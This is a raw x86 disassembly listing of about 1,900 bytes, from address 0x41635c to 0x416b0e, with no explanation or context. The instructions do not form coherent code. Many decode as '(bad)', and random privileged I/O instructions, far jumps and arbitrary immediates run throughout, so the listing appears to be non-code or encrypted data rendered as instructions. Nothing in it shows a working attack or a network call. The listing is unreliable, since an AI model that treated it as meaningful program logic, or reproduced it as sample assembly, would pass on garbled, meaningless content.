  41635c:	and    BYTE PTR [ecx-0x12],ah
  41635f:	fwait
  416360:	inc    ebx
  416361:	dec    eax
  416362:	js     0x416363
  416364:	dec    edi
  416365:	sti    
  416366:	jo     0x4163cc
  416368:	inc    esp
  416369:	mov    esi,0xbed96184
  41636e:	ins    DWORD PTR es:[edi],dx
  41636f:	xchg   DWORD PTR [ecx],ecx
  416371:	sahf   
  416372:	sub    dl,BYTE PTR [edx]
  416374:	dec    esi
  416375:	(bad)  
  416376:	mov    al,ds:0xb7e92548
  41637b:	imul   edi,DWORD PTR [edi+0x29],0xffffffcf
  41637f:	jmp    0x9670:0x67e86a26
  416386:	outs   dx,DWORD PTR ds:[esi]
  416387:	lods   eax,DWORD PTR ds:[esi]
  416388:	sbb    DWORD PTR [eax],0xffffffea
  41638b:	dec    ebx
  41638c:	fst    QWORD PTR [esi-0x7f783f45]
  416392:	ja     0x4163df
  416394:	push   eax
  416395:	inc    esp
  416396:	sbb    BYTE PTR [edx-0x6d],bh
  416399:	rol    DWORD PTR [edx+0x20],1
  41639c:	pop    es
  41639d:	psubsb mm7,QWORD PTR [edx-0x18]
  4163a1:	stos   BYTE PTR es:[edi],al
  4163a2:	div    DWORD PTR [ebx]
  4163a4:	push   ss
  4163a5:	mov    esp,0xb112a2cc
  4163aa:	mov    ch,0xec
  4163ac:	pop    ebx
  4163ad:	outs   dx,BYTE PTR ds:[esi]
  4163ae:	xchg   edi,eax
  4163af:	cmp    DWORD PTR [ecx+0xa82e365],0xe29d66e1
  4163b9:	push   edi
  4163ba:	pop    esp
  4163bb:	pusha  
  4163bc:	aas    
  4163bd:	js     0x4163f9
  4163bf:	in     eax,0xa
  4163c1:	pop    esi
  4163c2:	pop    ebp
  4163c3:	inc    ebp
  4163c4:	and    eax,DWORD PTR [ebx+ebx*8+0x42]
  4163c8:	pop    esi
  4163c9:	dec    edx
  4163ca:	icebp  
  4163cb:	(bad)  
  4163cc:	aad    0x16
  4163ce:	dec    ecx
  4163cf:	jle    0x41636b
  4163d1:	rcr    edi,cl
  4163d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d4:	mov    edx,0x89f66295
  4163d9:	jns    0x416374
  4163db:	(bad)  
  4163dc:	out    0x78,eax
  4163de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163df:	scas   al,BYTE PTR es:[edi]
  4163e0:	or     ch,BYTE PTR [eax]
  4163e2:	mov    DWORD PTR [edi],ebp
  4163e4:	push   0x30cbc432
  4163e9:	cdq    
  4163ea:	sub    BYTE PTR [edx],ch
  4163ec:	(bad)  
  4163ed:	call   0x6885:0x42ed500c
  4163f4:	xor    cl,BYTE PTR [edx]
  4163f6:	pop    edx
  4163f7:	test   bl,cl
  4163f9:	mov    edx,0xbb6bd425
  4163fe:	inc    ebp
  4163ff:	mov    ds:0x9f942bce,al
  416404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416405:	jo     0x416477
  416407:	iret   
  416408:	jno    0x4163ae
  41640a:	aaa    
  41640b:	sbb    dh,BYTE PTR [eax+ebx*8-0x7d]
  41640f:	sub    DWORD PTR [ecx-0x2d02e172],ecx
  416415:	scas   al,BYTE PTR es:[edi]
  416416:	dec    ebx
  416417:	jecxz  0x4163cc
  416419:	call   0xac4f3437
  41641e:	xchg   esp,eax
  41641f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416420:	inc    ebp
  416421:	or     DWORD PTR [ecx+0x66],esp
  416424:	je     0x4163e4
  416426:	cdq    
  416427:	mov    edi,0x8d6edd54
  41642c:	pop    ds
  41642d:	ss mov dl,0x84
  416430:	shr    DWORD PTR [edx-0x37],1
  416433:	retf   0x4002
  416436:	jbe    0x4163ba
  416438:	nop
  416439:	int    0x89
  41643b:	nop
  41643c:	dec    edx
  41643d:	outs   dx,BYTE PTR ds:[esi]
  41643e:	(bad)  
  41643f:	retf   
  416440:	jno    0x4163e5
  416442:	ret    
  416443:	cmp    eax,0x56d76c52
  416448:	ss cs pop ds
  41644b:	push   cs
  41644c:	fwait
  41644d:	jmp    0x4164aa
  41644f:	fs popa 
  416451:	sbb    ch,BYTE PTR [edi-0x12]
  416454:	fld1   
  416456:	out    0x82,al
  416458:	ja     0x4163ef
  41645a:	adc    eax,0xcdde3961
  41645f:	and    dl,ah
  416461:	or     ebp,DWORD PTR [edi+0x18c92447]
  416467:	mov    al,ds:0x81b8475
  41646c:	ss popa 
  41646e:	mov    edi,0xb6150d51
  416473:	rcr    DWORD PTR [ecx-0x156babc8],cl
  416479:	clc    
  41647a:	test   BYTE PTR [eax],al
  41647c:	jecxz  0x4164ed
  41647e:	in     eax,0xd
  416480:	push   0x25359e68
  416485:	sub    al,0xa2
  416487:	dec    edi
  416488:	add    al,0x25
  41648a:	out    0x5f,al
  41648c:	pushf  
  41648d:	mov    edx,0x4a93d14e
  416492:	push   eax
  416493:	mov    DWORD PTR [ebp-0x64],edi
  416496:	or     edi,DWORD PTR [ebp-0x1f]
  416499:	and    BYTE PTR [edi],al
  41649b:	idiv   DWORD PTR [ebx]
  41649d:	cmp    al,0xd3
  41649f:	adc    BYTE PTR [esi+0x76e293d2],dh
  4164a5:	cs xchg ebp,eax
  4164a7:	shl    BYTE PTR [esi],0x4c
  4164aa:	out    0x28,al
  4164ac:	lds    esi,FWORD PTR [edx-0x46]
  4164af:	leave  
  4164b0:	xchg   eax,esi
  4164b2:	sub    dh,cl
  4164b4:	sub    al,dh
  4164b6:	into   
  4164b7:	ins    DWORD PTR es:[edi],dx
  4164b8:	imul   esi,DWORD PTR [ecx-0x7a],0x1ec6517c
  4164bf:	test   eax,0xa2100d16
  4164c4:	inc    edx
  4164c5:	mov    edi,gs
  4164c7:	mov    ds:0xa4814586,eax
  4164cc:	push   0xf
  4164ce:	outs   dx,DWORD PTR ds:[esi]
  4164cf:	ja     0x41650b
  4164d1:	add    bl,BYTE PTR [ebp+0x35]
  4164d4:	popa   
  4164d5:	xchg   edx,eax
  4164d6:	and    ebx,edx
  4164d8:	mov    bl,0x7f
  4164da:	outs   dx,DWORD PTR ds:[esi]
  4164db:	xchg   BYTE PTR [edi-0x7dcb2584],dh
  4164e1:	popa   
  4164e2:	xchg   ecx,eax
  4164e3:	mov    cl,0xb7
  4164e5:	push   eax
  4164e6:	and    dh,BYTE PTR [ebp+0x7c901d7c]
  4164ec:	add    BYTE PTR [esi-0x62d12ed],dh
  4164f2:	js     0x4164ae
  4164f4:	ret    0x437c
  4164f7:	pop    ss
  4164f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f9:	lahf   
  4164fa:	pop    edx
  4164fb:	iret   
  4164fc:	cdq    
  4164fd:	ins    DWORD PTR es:[edi],dx
  4164fe:	jmp    0xba2b5320
  416503:	dec    ebp
  416504:	push   0x3808a6ac
  416509:	not    BYTE PTR [esi+0x60]
  41650c:	stc    
  41650d:	ja     0x4164f5
  41650f:	dec    edx
  416510:	dec    ebp
  416511:	hlt    
  416512:	enter  0xf656,0x58
  416516:	mov    cl,0x90
  416518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416519:	dec    ecx
  41651a:	rcr    DWORD PTR [esi+0x56],0x46
  41651e:	les    esp,FWORD PTR [eax]
  416520:	cmp    ebx,esp
  416522:	jmp    0x5d58:0xa854f211
  416529:	scas   eax,DWORD PTR es:[edi]
  41652a:	call   0x52f0:0xfabec411
  416531:	adc    cl,dl
  416533:	inc    edx
  416534:	cmp    DWORD PTR [eax-0x6c],eax
  416537:	jne    0x416577
  416539:	cmp    BYTE PTR [esi],dl
  41653b:	or     eax,0xf7088459
  416540:	popa   
  416541:	jne    0x41652a
  416543:	sub    eax,0xaee52691
  416548:	in     al,dx
  416549:	aad    0x4b
  41654b:	jmp    0x2038:0x376dde89
  416552:	xchg   edx,eax
  416553:	mov    ebp,0x734689a
  416558:	daa    
  416559:	cld    
  41655a:	xchg   BYTE PTR [ebx+eiz*1-0x66],al
  41655e:	mov    ds:0x15a207cd,al
  416563:	rcr    DWORD PTR [eax+ebp*1+0x50d8f043],0x4f
  41656b:	mov    cl,0x92
  41656d:	push   ecx
  41656e:	shl    BYTE PTR ds:0x8495db49,0xdd
  416575:	xor    DWORD PTR [eax],0x1b7acfe5
  41657b:	inc    ebx
  41657c:	jns    0x4165b8
  41657e:	shl    DWORD PTR [edx+0x31c2630c],0x59
  416585:	push   ecx
  416586:	aad    0xa0
  416588:	iret   
  416589:	push   esi
  41658a:	push   esp
  41658b:	dec    edx
  41658c:	ror    DWORD PTR [ebp-0x22],1
  41658f:	adc    ch,ch
  416591:	ds scas al,BYTE PTR es:[edi]
  416593:	jmp    0x41652b
  416595:	cli    
  416596:	out    0xc0,eax
  416598:	in     al,dx
  416599:	push   ss
  41659a:	aad    0x31
  41659c:	jge    0x41656b
  41659e:	cmp    bh,al
  4165a0:	push   esp
  4165a1:	mov    bh,0x76
  4165a3:	in     al,0x55
  4165a5:	fld    DWORD PTR [edi+0x219cfba5]
  4165ab:	jg     0x416583
  4165ad:	mov    ebp,0x8a9e2617
  4165b2:	test   BYTE PTR [esi],dh
  4165b4:	dec    esp
  4165b5:	sub    esp,edx
  4165b7:	inc    bp
  4165b9:	fmul   QWORD PTR [edi-0x56971a58]
  4165bf:	xchg   esi,eax
  4165c1:	jp     0x416563
  4165c3:	jmp    0x4165d9
  4165c5:	ret    
  4165c6:	cmp    al,0xcb
  4165c8:	rcr    DWORD PTR [edi+ebx*2],1
  4165cb:	scas   al,BYTE PTR es:[edi]
  4165cc:	push   esp
  4165cd:	das    
  4165ce:	xlat   BYTE PTR ds:[ebx]
  4165cf:	and    eax,0xa4a14681
  4165d4:	scas   eax,DWORD PTR es:[edi]
  4165d5:	or     BYTE PTR [ebp-0x519f283f],ah
  4165db:	cs (bad) 
  4165dd:	push   esi
  4165de:	and    al,0x5f
  4165e0:	ds repz add BYTE PTR ds:[eax+0x50],bh
  4165e6:	shl    BYTE PTR [ebx+eax*1],1
  4165e9:	std    
  4165ea:	(bad)  
  4165eb:	callw  0x2c35
  4165ef:	mov    ch,0xd2
  4165f1:	std    
  4165f2:	inc    ebx
  4165f3:	and    dl,bl
  4165f5:	fsubrp st(0),st
  4165f7:	xchg   esp,eax
  4165f8:	jmp    0xae392e76
  4165fd:	pusha  
  4165fe:	dec    ecx
  4165ff:	(bad)
  416602:	inc    ebp
  416603:	pop    cx
  416605:	cld    
  416606:	mov    esi,0x826773cb
  41660b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41660c:	shl    BYTE PTR [ebx],cl
  41660e:	cs (bad) 
  416610:	cmp    esp,DWORD PTR [ebx-0x3ba5a280]
  416616:	loopne 0x4165cd
  416618:	sbb    eax,0xa6ff8c22
  41661d:	test   BYTE PTR [ebx-0x534cbc32],bl
  416623:	push   edx
  416624:	cmp    BYTE PTR [ebp+0x1b],dh
  416627:	push   eax
  416628:	add    bl,cl
  41662a:	sub    edi,edi
  41662c:	std    
  41662d:	jno    0x416644
  41662f:	add    BYTE PTR [edi-0x43],0x1d
  416633:	ins    DWORD PTR es:[di],dx
  416635:	ret    
  416636:	mov    eax,ds:0x8504aed2
  41663b:	in     eax,0x86
  41663d:	sub    BYTE PTR [ecx-0x12],bh
  416640:	sub    ebx,eax
  416642:	or     DWORD PTR [edi+0x35393b31],eax
  416648:	cmp    al,0xfb
  41664a:	cmp    BYTE PTR [ebp-0x67c379e8],dl
  416650:	lea    esp,[ebx+eiz*2-0x5b]
  416654:	sub    BYTE PTR [esp+eiz*4-0x6bd74ead],0x6b
  41665c:	push   cs
  41665d:	out    dx,eax
  41665e:	ret    
  41665f:	(bad)  
  416660:	mov    ebp,0x3bc4129f
  416665:	mov    ds:0x18341926,eax
  41666a:	nop
  41666b:	push   ss
  41666c:	fdivr  QWORD PTR [edi-0x47]
  41666f:	jae    0x416658
  416671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416672:	push   ebp
  416673:	pop    esi
  416674:	cmp    eax,0xe410a142
  416679:	leave  
  41667a:	outs   dx,BYTE PTR ds:[esi]
  41667b:	pusha  
  41667c:	rcl    esi,0x7f
  41667f:	test   al,0x98
  416681:	xlat   BYTE PTR ds:[ebx]
  416682:	adc    DWORD PTR [eax-0x13],ecx
  416685:	xor    DWORD PTR [esi-0x1ed90948],ebp
  41668b:	fxch   st(6)
  41668d:	mov    ebp,0x662505c2
  416692:	adc    eax,0x927c6243
  416697:	pusha  
  416698:	data16 sahf 
  41669a:	cld    
  41669b:	(bad)  
  41669d:	pop    ss
  41669e:	leave  
  41669f:	pop    esp
  4166a0:	fidivr DWORD PTR [edi]
  4166a2:	out    0xaf,al
  4166a4:	dec    edx
  4166a5:	add    eax,0x62f8a0bb
  4166aa:	loope  0x4166e7
  4166ac:	out    0xa,al
  4166ae:	imul   esi,DWORD PTR [edi],0x93cf76d3
  4166b4:	push   esp
  4166b5:	stos   BYTE PTR es:[edi],al
  4166b6:	je     0x4166f9
  4166b8:	popa   
  4166b9:	std    
  4166ba:	cli    
  4166bb:	in     al,0xf3
  4166bd:	mov    eax,ds:0x6eb70fb0
  4166c2:	call   0xbf71dfbd
  4166c7:	adc    DWORD PTR [ecx],esi
  4166c9:	imul   eax,DWORD PTR [esi+0x31],0xf7aef58
  4166d0:	fist   DWORD PTR [esi+0x46]
  4166d3:	and    DWORD PTR [ebx+0x4754319],ebx
  4166d9:	ins    DWORD PTR es:[edi],dx
  4166da:	jmp    0x4a7d76c2
  4166df:	hlt    
  4166e0:	iret   
  4166e1:	(bad)  
  4166e2:	(bad)  
  4166e3:	repnz lea esi,fs:[ebx]
  4166e7:	push   esi
  4166e8:	fdiv   DWORD PTR [edi+0x6a2a400d]
  4166ee:	ss mov dh,0xbf
  4166f1:	pop    edx
  4166f2:	dec    eax
  4166f3:	inc    edx
  4166f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f5:	lods   eax,DWORD PTR ds:[esi]
  4166f6:	nop
  4166f7:	fsub   QWORD PTR [ebp+0x12]
  4166fa:	push   edi
  4166fb:	ins    BYTE PTR es:[edi],dx
  4166fc:	loopne 0x41672d
  4166fe:	xlat   BYTE PTR ds:[ebx]
  4166ff:	int    0xc7
  416701:	sti    
  416702:	pushf  
  416703:	mov    al,ds:0x858e18c2
  416708:	xchg   ebx,edi
  41670a:	into   
  41670b:	jg     0x41676c
  41670d:	jnp    0x416778
  41670f:	push   ebx
  416710:	dec    ecx
  416711:	mov    bl,ch
  416713:	cs cmc 
  416715:	lock inc esi
  416717:	push   eax
  416718:	mov    al,ds:0xfb13e378
  41671d:	inc    bl
  41671f:	test   edi,edx
  416721:	cmp    dh,BYTE PTR [eax]
  416723:	or     bl,BYTE PTR [esi+0x65ccd749]
  416729:	xor    DWORD PTR [edx-0xa],eax
  41672c:	push   edx
  41672d:	loope  0x416712
  41672f:	sbb    BYTE PTR [eax-0x5874aff7],0x33
  416736:	nop
  416737:	mov    bh,0xc6
  416739:	mov    ecx,0x160ec32
  41673e:	ja     0x416791
  416740:	daa    
  416741:	popa   
  416742:	or     dl,BYTE PTR [ecx+0x4c23cd79]
  416748:	cld    
  416749:	fmul   QWORD PTR [edi]
  41674b:	out    0x67,eax
  41674d:	test   DWORD PTR [ecx],edx
  41674f:	or     dh,BYTE PTR [ebp-0x53]
  416752:	jecxz  0x416723
  416754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416755:	outs   dx,BYTE PTR ds:[esi]
  416756:	fimul  DWORD PTR [ebp+0x29]
  416759:	or     al,0x72
  41675b:	add    al,0x9e
  41675d:	test   esp,esp
  41675f:	pop    ss
  416760:	cmp    ebx,DWORD PTR [edx]
  416762:	jmp    0x41671d
  416764:	inc    ebp
  416765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416766:	jae    0x41679b
  416768:	xor    DWORD PTR [edx-0x5c],esp
  41676b:	or     esi,DWORD PTR [edx]
  41676d:	xchg   DWORD PTR [ebx-0x1bd13226],edi
  416773:	xor    eax,0x782f009
  416778:	jb     0x416701
  41677a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41677b:	push   0xedcadd1b
  416780:	mov    edx,0xc402e1c3
  416785:	lds    dx,DWORD PTR [eax]
  416788:	fs jp  0x416809
  41678b:	mov    BYTE PTR [edx],al
  41678d:	in     eax,dx
  41678e:	mov    eax,DWORD PTR [esi+0x3a7477a2]
  416794:	fldenv [ecx]
  416796:	jmp    0x41679c
  416798:	cmp    BYTE PTR [ecx+esi*4],cl
  41679b:	xor    al,0x8e
  41679d:	xor    al,0xf7
  41679f:	add    bl,BYTE PTR [edi-0x5f]
  4167a2:	and    DWORD PTR [edx+0x59dbd263],esp
  4167a8:	jp     0x416763
  4167aa:	mov    dl,0x10
  4167ac:	outs   dx,DWORD PTR ds:[esi]
  4167ad:	test   BYTE PTR [esi-0x2d],ch
  4167b0:	in     eax,dx
  4167b1:	test   BYTE PTR cs:[edx-0x3b],dl
  4167b5:	shr    cl,1
  4167b7:	lds    esi,FWORD PTR [ebp+ebx*8+0x22]
  4167bb:	icebp  
  4167bc:	mov    ch,BYTE PTR [esi]
  4167be:	adc    BYTE PTR [edx-0x1a],al
  4167c1:	or     BYTE PTR [ebx-0x15],bh
  4167c4:	ds mov ch,0x37
  4167c7:	sbb    BYTE PTR [ebx+0xd],ch
  4167ca:	pop    es
  4167cb:	mov    dh,0x3c
  4167cd:	cmp    BYTE PTR [ebx],bh
  4167cf:	add    esi,DWORD PTR [ebp+0x60bd90e5]
  4167d5:	and    ah,BYTE PTR [ebp+0xee98a9b]
  4167db:	outs   dx,DWORD PTR ds:[esi]
  4167dc:	dec    esi
  4167dd:	or     BYTE PTR [edx+0x659d988e],ch
  4167e3:	sub    ebp,edi
  4167e5:	(bad)
  4167e8:	call   0xbc39:0x4acdceb2
  4167ef:	mov    esp,0xbf54bad9
  4167f4:	sbb    ebp,DWORD PTR [ebp+0x31f94ae9]
  4167fa:	xchg   ecx,eax
  4167fb:	adc    BYTE PTR [eax-0x423fe05d],0x3a
  416802:	retf   0xdaf5
  416805:	adc    al,0x21
  416807:	icebp  
  416808:	imul   ebx,DWORD PTR [esi-0x71],0x8457d60c
  41680f:	mov    bl,0x39
  416811:	add    BYTE PTR [ebx],ah
  416813:	int    0xd7
  416815:	adc    ch,dl
  416817:	mov    esi,0x4290173b
  41681c:	imul   edi
  41681e:	sar    edi,1
  416820:	stc    
  416821:	mov    eax,ds:0xbc567c29
  416826:	in     al,0x66
  416828:	mov    cl,bl
  41682a:	fild   WORD PTR [ebx-0x38fc7aa9]
  416830:	pop    ss
  416831:	sti    
  416832:	out    dx,al
  416833:	dec    esi
  416834:	test   eax,0xf878db19
  416839:	add    bh,BYTE PTR [ecx]
  41683b:	mov    al,ds:0x57d0ee3b
  416840:	mov    ebp,0x98726b13
  416845:	(bad)
  41684a:	jmp    0xfc77:0xc12d856a
  416851:	jbe    0x41685a
  416853:	je     0x4168a1
  416855:	pop    ebx
  416856:	pop    ds
  416857:	loop   0x41689d
  416859:	inc    eax
  41685a:	mov    ds,ebx
  41685c:	in     al,0x43
  41685e:	pop    esp
  41685f:	cmp    al,0x71
  416861:	imul   edi,DWORD PTR [edx],0x6c
  416864:	shl    BYTE PTR [ebx+edx*4-0x23bbf123],0x58
  41686c:	rcr    ah,cl
  41686e:	test   BYTE PTR [eax+edx*1],dh
  416871:	cmc    
  416872:	mov    ch,0x96
  416874:	push   ebp
  416875:	sbb    DWORD PTR [ecx],ecx
  416877:	sub    BYTE PTR [edx-0x22],dh
  41687a:	stc    
  41687b:	cmp    eax,0x5f75c780
  416880:	sub    DWORD PTR [edx+0x273f38d7],esi
  416886:	stos   BYTE PTR es:[edi],al
  416887:	push   ebp
  416888:	fcmovu st,st(6)
  41688a:	lock bound ebx,QWORD PTR [ebx+0x42a3f02d]
  416891:	mov    esi,0xc88949a9
  416896:	in     eax,dx
  416897:	and    BYTE PTR [edx],ah
  416899:	adc    al,0x41
  41689b:	push   esp
  41689c:	add    ah,BYTE PTR [esi]
  41689e:	jmp    0x41683a
  4168a0:	sub    al,0x19
  4168a2:	gs out dx,eax
  4168a4:	or     bl,al
  4168a6:	bts    DWORD PTR [esi],ebx
  4168a9:	daa    
  4168aa:	(bad)  ds:0x5171fd97
  4168b0:	mov    cl,0x3c
  4168b2:	repz arpl ax,si
  4168b5:	cmp    bh,BYTE PTR [edx]
  4168b7:	pop    ebp
  4168b8:	cld    
  4168b9:	and    eax,0x8f98d759
  4168be:	cwde   
  4168bf:	adc    BYTE PTR [edi],ah
  4168c1:	add    esi,ebx
  4168c3:	jmp    0x39ef76ca
  4168c8:	std    
  4168c9:	sub    DWORD PTR [esi-0x1386e13e],ebp
  4168cf:	shr    dl,1
  4168d1:	push   0xdd9d46d0
  4168d6:	and    al,0xfd
  4168d8:	call   FWORD PTR [eax]
  4168da:	xor    DWORD PTR [ebx+edi*2],ebp
  4168dd:	cmc    
  4168de:	cs cdq 
  4168e0:	out    dx,al
  4168e1:	push   ds
  4168e2:	call   0x40de0cc7
  4168e7:	shl    BYTE PTR ds:0xf8f3bf,1
  4168ed:	ret    0xf5a9
  4168f0:	sti    
  4168f1:	pop    esi
  4168f2:	lahf   
  4168f3:	push   edx
  4168f4:	add    bl,ch
  4168f6:	mov    bl,0x24
  4168f8:	jmp    0x4168cb
  4168fa:	jbe    0x416889
  4168fc:	retf   
  4168fd:	push   esi
  4168fe:	in     al,0x16
  416900:	scas   al,BYTE PTR es:[edi]
  416901:	push   es
  416902:	cld    
  416903:	ja     0x4168a2
  416905:	adc    al,0x61
  416907:	pop    ecx
  416908:	xchg   ebx,eax
  416909:	xchg   ecx,eax
  41690a:	jl     0x416908
  41690c:	into   
  41690d:	pop    ebp
  41690e:	es nop
  416910:	bound  ebp,QWORD PTR [ebx]
  416912:	(bad)  
  416913:	arpl   WORD PTR [ecx],di
  416915:	mov    eax,esp
  416917:	shl    BYTE PTR [eax],0x4b
  41691a:	xchg   esp,eax
  41691b:	dec    edi
  41691c:	mov    bh,BYTE PTR [esi]
  41691e:	pop    ecx
  41691f:	lods   al,BYTE PTR ds:[esi]
  416920:	cmp    BYTE PTR [eax-0x25],0xbd
  416924:	daa    
  416925:	retf   
  416926:	int    0x86
  416928:	fidivr DWORD PTR [ebx+0x6]
  41692b:	mov    ecx,0x69e0a975
  416930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416932:	push   ss
  416933:	jne    0x41691d
  416935:	js     0x4168d4
  416937:	xlat   BYTE PTR ds:[ebx]
  416938:	and    dl,BYTE PTR [ebp-0x7fbbe39f]
  41693e:	mov    cl,0x86
  416940:	int3   
  416941:	jb     0x4169b7
  416943:	xor    bh,bh
  416945:	xchg   edi,eax
  416946:	and    dh,BYTE PTR [esp+ebp*8]
  416949:	sbb    ebp,0xac763bd6
  41694f:	xlat   BYTE PTR ds:[ebx]
  416950:	out    0x5a,eax
  416952:	rcr    BYTE PTR [ebp+0x7],0x38
  416956:	into   
  416957:	jb     0x41693f
  416959:	dec    eax
  41695a:	add    edx,DWORD PTR [eax+0x4fffb2d6]
  416960:	mov    bh,0xa0
  416962:	popf   
  416963:	xchg   BYTE PTR [eax-0xea6306],dh
  416969:	adc    BYTE PTR [ebx+0x39],dh
  41696c:	dec    eax
  41696d:	stos   BYTE PTR es:[edi],al
  41696e:	hlt    
  41696f:	jge    0x4169bf
  416971:	retf   
  416972:	out    0xf,eax
  416974:	vmread esp,edi
  416977:	mov    ds:0x93014b18,al
  41697c:	sbb    al,0x11
  41697e:	mov    ch,0xfa
  416980:	mov    al,ds:0x9d4e6949
  416985:	mov    bl,0x12
  416987:	push   ebp
  416988:	rol    BYTE PTR [edx+ebp*1+0x290a4e68],cl
  41698f:	mov    al,0xbf
  416991:	ins    BYTE PTR es:[edi],dx
  416992:	mov    ebp,0x2f32b5b3
  416997:	cmp    eax,0x9cd7de11
  41699c:	or     esi,ecx
  41699e:	cld    
  41699f:	and    eax,0xab427772
  4169a4:	jge    0x416926
  4169a6:	out    dx,al
  4169a7:	loopne 0x416a06
  4169a9:	push   edx
  4169aa:	lods   eax,DWORD PTR ds:[esi]
  4169ab:	push   ebx
  4169ac:	loopne 0x416988
  4169ae:	(bad)  
  4169af:	cld    
  4169b0:	test   al,dl
  4169b2:	jle    0x4169c4
  4169b4:	enter  0xb7c0,0xa5
  4169b8:	xchg   edi,eax
  4169b9:	jmp    0x7f02100b
  4169be:	test   eax,0x7234cb7f
  4169c3:	hlt    
  4169c4:	jne    0x416a01
  4169c6:	xchg   esi,eax
  4169c7:	inc    ebp
  4169c8:	pop    ebp
  4169c9:	jo     0x4169c7
  4169cb:	fsubr  DWORD PTR [ebp+0x4d4c5d9a]
  4169d1:	jnp    0x4169e4
  4169d3:	inc    ecx
  4169d4:	aaa    
  4169d5:	or     cl,BYTE PTR [edi]
  4169d7:	sbb    edi,DWORD PTR [esp+edi*1+0x343ba01a]
  4169de:	fcmovne st,st(3)
  4169e0:	jecxz  0x416a1f
  4169e2:	add    edx,DWORD PTR ds:[eax]
  4169e5:	sar    bh,0xec
  4169e8:	xlat   BYTE PTR ds:[ebx]
  4169e9:	jnp    0x4169f5
  4169eb:	and    bl,BYTE PTR [eax]
  4169ed:	stos   BYTE PTR es:[edi],al
  4169ee:	jb     0x4169d2
  4169f0:	jmp    0x4169c9
  4169f2:	jmp    0x42b2:0x8caf81f1
  4169f9:	push   ebx
  4169fa:	mov    ebx,0x381f3272
  4169ff:	pusha  
  416a00:	pop    edi
  416a01:	pop    edi
  416a02:	xor    al,0x73
  416a04:	cs jmp 0xee0a:0x6a5c36f4
  416a0c:	adc    BYTE PTR [edi*1+0x61e4548a],dl
  416a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a14:	push   es
  416a15:	xor    DWORD PTR [ebx-0x76],ebx
  416a18:	push   eax
  416a19:	cs stc 
  416a1b:	sbb    ecx,DWORD PTR [edx+edi*2]
  416a1e:	and    bh,bl
  416a20:	lahf   
  416a21:	jp     0x4169e3
  416a23:	mul    BYTE PTR [esi-0x2f]
  416a26:	mov    al,BYTE PTR [ebx]
  416a28:	mov    esp,0xaaa5c4a
  416a2d:	ins    BYTE PTR es:[edi],dx
  416a2e:	jbe    0x416a75
  416a30:	test   al,0xd4
  416a32:	(bad)  
  416a33:	xchg   edi,eax
  416a34:	retf   0x356f
  416a37:	es popa 
  416a39:	jae    0x416a22
  416a3b:	iret   
  416a3c:	idiv   dl
  416a3e:	rol    cl,0x56
  416a41:	xchg   DWORD PTR [eax],ecx
  416a43:	push   cs
  416a44:	stos   DWORD PTR es:[edi],eax
  416a45:	push   edx
  416a46:	call   0xa10569cd
  416a4b:	test   ebp,eax
  416a4d:	cmp    ebp,edx
  416a4f:	jecxz  0x416abd
  416a51:	push   ecx
  416a52:	push   ebp
  416a53:	pop    ebp
  416a54:	push   esi
  416a55:	mov    al,ds:0xb01e94b5
  416a5a:	xor    DWORD PTR [ebp+ebp*1-0x41],esi
  416a5e:	(bad)  
  416a5f:	call   0x9fc8:0x18ac1b21
  416a66:	loop   0x416a4a
  416a68:	lea    esi,[ecx-0x4d5666e7]
  416a6e:	cmp    DWORD PTR [ebx+0x7c05d578],ecx
  416a74:	shr    DWORD PTR [ecx+0x4b4a1fd6],0x90
  416a7b:	and    eax,0x8ea75a19
  416a80:	cmp    esp,DWORD PTR cs:[ebp-0x38]
  416a84:	dec    eax
  416a85:	cwde   
  416a86:	dec    eax
  416a87:	sub    al,0x4
  416a89:	into   
  416a8a:	adc    edi,DWORD PTR [ebx]
  416a8c:	dec    ecx
  416a8d:	cmp    dl,dh
  416a8f:	ss cwde 
  416a91:	pop    ebp
  416a92:	xchg   esi,eax
  416a93:	and    DWORD PTR [ecx-0x12],esp
  416a96:	pop    eax
  416a97:	test   BYTE PTR [esi],bl
  416a99:	pop    edi
  416a9a:	(bad)  
  416a9b:	pop    ecx
  416a9c:	or     eax,0xe8ff852c
  416aa1:	xchg   DWORD PTR [edx-0x42c91aeb],edx
  416aa7:	or     edi,DWORD PTR [esi]
  416aa9:	sbb    bl,BYTE PTR [ebx]
  416aab:	mov    cl,ah
  416aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aae:	lods   al,BYTE PTR cs:[esi]
  416ab0:	jecxz  0x416ae7
  416ab2:	fisub  WORD PTR [ebp-0x664bde16]
  416ab8:	jmp    0xcffa:0xe15e20d5
  416abf:	jno    0x416b36
  416ac1:	dec    esp
  416ac2:	inc    edi
  416ac3:	std    
  416ac4:	mov    ?,WORD PTR [edi-0x7411d7ad]
  416aca:	mov    ebx,0x200f79fa
  416acf:	inc    esi
  416ad0:	jns    0x416b27
  416ad2:	sub    bl,cl
  416ad4:	out    dx,eax
  416ad5:	adc    bh,BYTE PTR [ebx-0x76a8ba63]
  416adb:	pop    ss
  416adc:	and    al,0x6f
  416ade:	sbb    eax,0xbf9046b9
  416ae4:	pop    eax
  416ae5:	mov    ss,esp
  416ae7:	(bad)  
  416ae8:	jecxz  0x416b10
  416aea:	test   eax,0x4f5aadbb
  416aef:	xor    dl,BYTE PTR [esp+eiz*8]
  416af2:	mov    dl,0xf1
  416af4:	mov    WORD PTR [edx+0x4c77c36b],ds
  416afa:	cmp    eax,0x80474ad2
  416aff:	test   al,0xc3
  416b01:	scas   al,BYTE PTR es:[edi]
  416b02:	les    ebp,FWORD PTR [esi+edi*2-0x2c]
  416b06:	(bad)  
  416b07:	jp     0x416b61
  416b09:	fs cmp ch,BYTE PTR gs:[ecx-0x9]
  416b0e:	(bad)  
